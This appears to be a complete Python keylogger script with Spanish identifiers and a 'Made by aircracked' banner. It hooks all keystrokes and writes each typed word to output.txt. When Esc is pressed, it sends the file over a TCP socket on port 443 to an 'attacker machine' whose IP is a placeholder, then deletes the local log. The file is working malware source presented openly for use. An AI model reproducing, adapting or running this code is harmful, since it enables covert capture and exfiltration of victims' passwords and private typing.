print("""
    /\\_/\\
   ( o.o )
    > ^ <
  Made by aircracked
      \\|/
""")
import keyboard
import sys
import socket
import os
from colorama import Fore, Style


green = Fore.GREEN
reset = Style.RESET_ALL


palabra = ""


def pulsacion_tecla(pulsacion): 

    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
    
        if pulsacion.name == 'space':
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable(): 
            palabra += pulsacion.name


keyboard.hook(pulsacion_tecla) 


def guardar_palabra_al_espacio():
    
    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
    print(f'Palabra registrada: {Fore.GREEN}{palabra}{Style.RESET_ALL}')
    resetear_palabra() 


def resetear_palabra():
    global palabra
    palabra = ""


def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
    try:
        with open(archivo, 'rb') as file:
            contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((direccion_ip, puerto))
            s.sendall(contenido)
            os.remove("output.txt")
            sys.exit()

    except Exception as e:
        print(f"Error al enviar el archivo: {e}")


def detener_script():
    print("El Keylogger esta enviando los datos a la maquina atacante")
    keyboard.unhook_all()  
    enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)


direccion_ip_destino = 'CHANGE THIS'
puerto_destino = 443
archivo_a_enviar = 'output.txt'

try:
    keyboard.wait('esc') 
    detener_script()
except KeyboardInterrupt:
    print(f'{Fore.GREEN}Script Detenido por el usuario{Style.RESET_ALL}')
    pass
